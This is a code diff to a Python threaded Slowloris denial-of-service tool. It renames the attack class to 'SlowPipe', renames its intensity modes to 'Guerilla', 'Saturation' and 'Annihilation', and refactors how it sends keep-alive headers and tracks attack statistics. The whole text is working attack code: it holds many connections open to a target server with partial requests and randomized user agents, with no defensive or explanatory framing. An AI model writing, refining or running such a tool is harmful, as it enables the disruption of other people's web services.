@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import threading
 import socket
 import random
@@ -7,21 +8,26 @@ from urllib.parse import urlparse
 import config
 from utils.network import get_random_user_agent
 
-class SlowLoris(threading.Thread):
+class SlowPipe(threading.Thread):
     def __init__(self, target_url, mode):
         super().__init__()
         self.daemon = True
         self.target = urlparse(target_url)
         self.mode = mode
         self.connection = None
+        self.keep_alive_headers = [
+            "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
+            "X-b: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
+            "X-c: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
+        ]
 
     def get_attack_params(self):
         sleep_interval = 15
-        if self.mode == "Stealth":
+        if self.mode == "Guerilla":
             sleep_interval = 25
-        elif self.mode == "Overload":
+        elif self.mode == "Saturation":
             sleep_interval = 10
-        elif self.mode == "Blitz":
+        elif self.mode == "Annihilation":
             sleep_interval = 5
         return sleep_interval
 
@@ -31,7 +37,7 @@ class SlowLoris(threading.Thread):
             f"Host: {self.target.netloc}",
             f"User-Agent: {get_random_user_agent()}",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language: en-us,en;q=0.5",
+            "Accept-Language: vi-VN,en-us;q=0.5",
             "Connection: keep-alive"
         ]
         return "\r\n".join(headers) + "\r\n"
@@ -55,19 +61,17 @@ class SlowLoris(threading.Thread):
 
                 while not config.stop_event.is_set():
                     try:
-                        keep_alive_header = f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8")
-                        self.connection.send(keep_alive_header)
-                        config.attack_stats["bytes_sent"] += len(keep_alive_header)
+                        self.connection.send(random.choice(self.keep_alive_headers))
                         time.sleep(sleep_interval)
                     except socket.error:
-                        config.attack_stats["errors"] += 1
+                        config.attack_stats["connect_error"] += 1
                         break
             except socket.error:
-                config.attack_stats["errors"] += 1
+                config.attack_stats["connect_error"] += 1
             finally:
                 if self.connection:
                     self.connection.close()
-                time.sleep(1) 
+                time.sleep(1)
 
         config.attack_stats["active_threads"] -= 1
 
